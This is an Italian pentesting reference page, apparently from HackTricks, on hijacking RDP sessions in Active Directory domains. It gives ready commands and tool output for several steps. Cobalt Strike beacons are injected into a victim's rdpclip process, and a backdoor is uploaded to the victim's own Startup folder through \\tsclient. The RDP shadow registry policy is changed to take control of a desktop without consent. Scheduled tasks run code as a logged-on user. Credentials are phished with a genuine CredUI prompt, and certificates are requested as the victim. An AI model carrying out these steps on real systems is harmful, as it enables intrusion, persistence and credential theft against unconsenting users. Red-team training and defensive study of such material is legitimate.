# Abuso delle sessioni RDP

{{#include ../../banners/hacktricks-training.md}}

## Process Injection tramite RDP

Se il **gruppo esterno** ha **accesso RDP** a qualsiasi **computer** nel dominio corrente, un **attaccante** potrebbe **compromettere quel computer e aspettarlo**.

Una volta che l'utente ha effettuato l'accesso tramite RDP, l'**attaccante può eseguire il pivot verso la sessione di quell'utente** e abusare delle sue autorizzazioni nel dominio esterno.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Controlla **altri modi per rubare sessioni con altri strumenti** [**in questa pagina.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se un utente accede tramite **RDP a una macchina** dove un **attacker** lo sta **aspettando**, l'attacker sarà in grado di **iniettare un beacon nella sessione RDP dell'utente** e, se la **vittima ha montato la propria unità** durante l'accesso tramite RDP, l'**attacker potrebbe accedervi**.

In questo caso potresti semplicemente **compromettere** il **computer originale della vittima** scrivendo una **backdoor** nella **cartella di avvio**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Se sei un **local admin** su un host in cui la vittima ha già una **active RDP session**, potresti riuscire a **visualizzare/controllare quel desktop senza rubare la password o effettuare il dumping di LSASS**.<sup>[[1]](#references)</sup>

Questo dipende dalla policy di **shadowing di Remote Desktop Services** memorizzata in:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valori interessanti:

- `0`: Disabilitato
- `1`: `EnableInputNotify` (controllo, approvazione dell'utente richiesta)
- `2`: `EnableInputNoNotify` (controllo, **nessuna approvazione dell'utente**)
- `3`: `EnableNoInputNotify` (sola visualizzazione, approvazione dell'utente richiesta)
- `4`: `EnableNoInputNoNotify` (sola visualizzazione, **nessuna approvazione dell'utente**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Ciò è particolarmente utile quando un utente privilegiato connesso tramite RDP ha lasciato aperti un desktop sbloccato, una sessione KeePass, una console MMC, una sessione del browser o una admin shell.

## Scheduled Tasks As Logged-On User

Se sei **local admin** e l'utente target è **attualmente connesso**, Task Scheduler può avviare codice **come quell'utente senza la sua password**.<sup>[[1]](#references)[[4]](#references)</sup>

Questo trasforma la sessione di logon esistente della vittima in una primitiva di esecuzione:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Note:

- Se l'utente **non ha effettuato l'accesso**, Windows richiede generalmente la password per creare un'attività che venga eseguita come quell'utente.
- Se l'utente **ha effettuato l'accesso**, l'attività può riutilizzare il contesto di accesso esistente.
- Questo è un metodo pratico per eseguire azioni GUI o avviare binari all'interno della sessione della vittima senza interagire con LSASS.

## Abuso del prompt CredUI dalla sessione della vittima

Una volta ottenuta la possibilità di eseguire codice **all'interno del desktop interattivo della vittima** (ad esempio tramite **Shadow RDP** o una **scheduled task eseguita come quell'utente**), è possibile visualizzare un **vero prompt per le credenziali di Windows** usando le API CredUI e acquisire le credenziali inserite dalla vittima.<sup>[[1]](#references)</sup>

API rilevanti:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flusso tipico:

1. Avviare un binario nella sessione della vittima.
2. Visualizzare un prompt di autenticazione al dominio che corrisponda al branding del dominio corrente.
3. Estrarre i dati dal buffer di autenticazione restituito.
4. Convalidare le credenziali fornite e, facoltativamente, continuare a visualizzare il prompt finché non vengono inserite credenziali valide.

Questo è utile per il **phishing on-host**, perché il prompt viene renderizzato dalle API standard di Windows invece che tramite un modulo HTML falso.

## Richiesta di un PFX nel contesto della vittima

La stessa primitiva della **scheduled task-as-user** può essere utilizzata per richiedere un **certificato/PFX come la vittima connessa**. In seguito, tale certificato può essere utilizzato per l'**autenticazione AD** come quell'utente, evitando completamente il furto della password.<sup>[[1]](#references)[[5]](#references)</sup>

Flusso di alto livello:

1. Ottenere **local admin** su un host in cui la vittima ha effettuato l'accesso.
2. Eseguire la logica di enrollment/export come la vittima usando una **scheduled task**.
3. Esportare il **PFX** risultante.
4. Utilizzare il PFX per PKINIT / l'autenticazione AD basata su certificato.

Consultare le pagine AD CS per gli abusi successivi:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Riferimenti

- [1] [SensePost - Dalle reti flat ai domini protetti con modelli di tiering](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - modulo schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Richiesta di un PFX tramite scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
